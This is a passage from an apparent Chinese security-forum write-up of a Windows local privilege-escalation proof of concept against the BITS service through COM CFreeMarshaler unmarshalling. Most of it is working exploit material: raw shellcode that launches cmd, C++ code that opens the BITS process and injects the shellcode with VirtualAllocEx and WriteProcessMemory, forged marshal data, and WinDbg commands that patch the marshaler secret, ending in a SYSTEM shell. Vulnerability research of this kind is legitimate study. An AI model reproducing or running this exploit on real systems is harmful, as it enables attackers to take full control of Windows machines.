
```
void initParam()
{
    //我的shellcode
    char shellcode[] = "\x99\x65\x48\x8b\x42\x60\x48\x8b\x40\x18\x48\x8b\x70\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x48\x31\xdb\x48\x31\xf6\x8b\x5f\x3c\x48\x01\xfb\xb2\x88\x8b\x1c\x13\x48\x01\xfb\x8b\x73\x1c\x48\x01\xfe\x99\x66\xba\x28\x05\x8b\x04\x96\x48\x01\xf8\xeb\x17\x59\x99\x48\xff\xc2\xff\xd0\x99\x66\xba\x29\x01\x8b\x04\x96\x48\x01\xf8\x48\x31\xc9\xff\xd0\xe8\xe4\xff\xff\xff\x63\x6d\x64";

    int len = strlen(shellcode);
    DWORD l = 0;
    printf("shellcode length %d bytes\n", len);

    VirtualProtect(shellcode, len, PAGE_EXECUTE_READWRITE, &l);
    //976是bits服务的pid
    HANDLE btshl = OpenProcess(PROCESS_ALL_ACCESS,
        FALSE, 976);
    LPBYTE si[100];
    memset(&si, 0, sizeof(si));
    MEMORY_BASIC_INFORMATION basicInfo = { 0 };
    ///FindSharedSection(*si, btshl);

    bstr_t szKey = _T("aaaaaaaaaaaaaaa123456");
    LPVOID lpRemoteAddress = VirtualAllocEx(btshl, NULL, szKey.length()+4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    LPVOID lpRemoteAddress2 = VirtualAllocEx(btshl, NULL, szKey.length()+4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    LPVOID lpRemoteAddress3 = VirtualAllocEx(btshl, NULL, szKey.length()+4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    std::vector<BYTE> secret(16);
    //这里初始话我们CFreeMarshaler中自定义的的secret
    memcpy(&secret[0], szKey, secret.size());
    //构造secret
    std::vector<BYTE> retdata = BuildFTMData(1, (ULONGLONG)lpRemoteAddress, secret);
    //把构造好的secret传给TypeLibWrapper让他里面unmarshal成CFreeMarshaler
    TypeLibWrapper *tlb = new TypeLibWrapper(target_tlb, secret);
    //把参数写入bit服务的内存中
    DWORD wrt;
    ULONGLONG refptr = ((ULONGLONG)lpRemoteAddress2 - 8);
    BOOL bl = WriteProcessMemory(btshl, lpRemoteAddress, &refptr, 8, &wrt);
    if (wrt == 0)
    {
        printf("[x] can not WriteProcessMemory process:%d\n", GetLastError());
    }
    ULONGLONG refptr2 = (ULONGLONG)lpRemoteAddress3;
    bl = WriteProcessMemory(btshl, lpRemoteAddress2, &refptr2, 8, &wrt);
    if (wrt == 0)
    {
        printf("[x] can not WriteProcessMemory2 process:%d\n", GetLastError());
    }
    bl = WriteProcessMemory(btshl, lpRemoteAddress3, shellcode, (strlen(shellcode) + 1)*sizeof(char), &wrt);
    if (wrt == 0)
    {
        printf("[x] can not WriteProcessMemory2 process:%d\n", GetLastError());
    }
    //设置shellcode为可读写
    bl = VirtualProtectEx(btshl, lpRemoteAddress3, len, PAGE_EXECUTE_READWRITE, &l);
}

//构造secret最终用来反序列化
std::vector<BYTE> BuildFTMData(UINT mshflags, ULONGLONG ptr, const std::vector<BYTE>& secret)
{
    std::vector<BYTE> ret(4 + sizeof(ptr) + secret.size());

    memcpy(&ret[0], &mshflags, sizeof(mshflags));
    memcpy(&ret[4], &ptr, sizeof(ptr));
    memcpy(&ret[4 + sizeof(ptr)], &secret[0], secret.size());

    return ret;
}
```

参数都构造好了,就看最终`CFreeMarshaler`如何反序列化了,看代码:

```
virtual HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    /* [annotation][in] */
    _In_ REFIID riid,
    /* [annotation][unique][in] */
    _In_opt_ void *pv,
    /* [annotation][in] */
    _In_ DWORD dwDestContext,
    /* [annotation][unique][in] */
    _Reserved_ void *pvDestContext,
    /* [annotation][in] */
    _In_ DWORD mshlflags,
    /* [annotation][out] */
    _Out_ CLSID *pCid)
{
    GUID CLSID_FreeThreadedMarshaller = { 0x0000033A, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, } };
    //这里返回CLSID_FreeThreadedMarshaller就可以了,bit服务会作为CFreeMarshaler来unmarshal;
    memcpy(pCid, &CLSID_FreeThreadedMarshaller, sizeof(*pCid));

    return S_OK;
}

virtual HRESULT STDMETHODCALLTYPE MarshalInterface(
    /* [annotation][unique][in] */
    _In_ IStream *pStm,
    /* [annotation][in] */
    _In_ REFIID riid,
    /* [annotation][unique][in] */
    _In_opt_ void *pv,
    /* [annotation][in] */
    _In_ DWORD dwDestContext,
    /* [annotation][unique][in] */
    _Reserved_ void *pvDestContext,
    /* [annotation][in] */
    _In_ DWORD mshlflags)
{
    //往strem写入需要反序列化的数据也就是我之前构造的的secret
    return pStm->Write(&_data[0], _data.size(), &written);
}
```

### 下面借助`windbg`来调试:

开启`windbg`双机调试,具体方法自己百度

第一步查看bits服务`pid`为976(16进制3d0)如图:

![](https://bbs.kanxue.com/upload/attach/201804/609565_CCKZ32EBEG5HAJX.png)

执行命令

```
!process 0 0 svchost.exe
```

查找bits服务 如图:

![](https://bbs.kanxue.com/upload/attach/201804/609565_CGJ6ETR9HMQ7GYY.png)

找到后它的process地址是`fffffa8032b3e060`

依次运行,注意一定要等`windbg`加载`ole32`的符号要不然断点无效

```
.process /i /p fffffa8032b3e060; g
.reload /f /user ole32.dll;lm m ole32;
.process /r /p fffffa8032b3e060
```

这个时候打`!peb`或者`?@$proc`看看是不是进入bits进程 如图:

![](https://bbs.kanxue.com/upload/attach/201804/609565_6EGNSEFV2US4JPC.png)

之后就可以下断点了

```
bp /p @$proc ole32!CFreeMarshaler::UnmarshalInterface ".printf \"InItStatus:=>%d, Secret:is=>%d\", ole32!CFreeMarshaler::_fSecretInit , ole32!CFreeMarshaler::_SecretBlock;dc ole32!CFreeMarshaler::_fSecretInit ; dc ole32!CFreeMarshaler::_SecretBlock; "
```

`bl` 查看断点就可以了

运行我的poc,先触发`CoImpersonateClient`;看到确实是`systemtoken`;如图:

![](https://bbs.kanxue.com/upload/attach/201804/609565_BM9PN6M5SB8M828.jpg)

![](https://bbs.kanxue.com/upload/attach/201804/609565_3KYND5QJY5VFM46.jpg)

![](https://bbs.kanxue.com/upload/attach/201804/609565_DAX76J3WEG8R9KC.jpg)

![](https://bbs.kanxue.com/upload/attach/201804/609565_87R7ZZ2S4CBWRJH.jpg)

继续运行成功触发断点 [`CFreeMarshaler::UnmarshalInterface`]如图:

![](https://bbs.kanxue.com/upload/attach/201804/609565_WY372C23V75YWTH.png)

接下来运行命令

```
eb ole32!CFreeMarshaler::_fSecretInit 01;
ed ole32!CFreeMarshaler::_SecretBlock 676e6177 6c656263 73676e69 7374666f;
dc ole32!CFreeMarshaler::_SecretBlock L10;
dc ole32!CFreeMarshaler::_fSecretInit L10;
```

把我们`CFreeMarshaler`中自定义的的`secret`写进去

代码继续执行我几个`cmp`和`jne`有兴趣的可以自己跟一下,实际上就是我刚才贴的逆向`CFreeMarshaler::UnmarshalInterface`里面代码

```
(*(void (__stdcall **)(int))(*(_DWORD *)v5 + 4))(v5);
```

如图:

![](https://bbs.kanxue.com/upload/attach/201804/609565_7HRBPH68STGBW83.png)

由于是64位系统 `v5+4`变成`v5+8`

图中的`rax`就是`shellcode`地址

`shellcode`成功运行

![](https://bbs.kanxue.com/upload/attach/201804/609565_EFKBC72EMXDVXR6.png)

,出现`cmd.exe`是system权限 如图:

![](https://bbs.kanxue.com/upload/attach/201804/609565_HG747M5964DDNRV.png)

备注:我用的这个自定义com组件只是为了调试方便,可以换成任何windows自带的启动用户为`interactiveuser`的com组件,相关`appid`自己找一下,比如(`"AP Client 1.0 HelpPane Type Library"`)

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2018-4-2 22:14 被王cb编辑 ，原因：
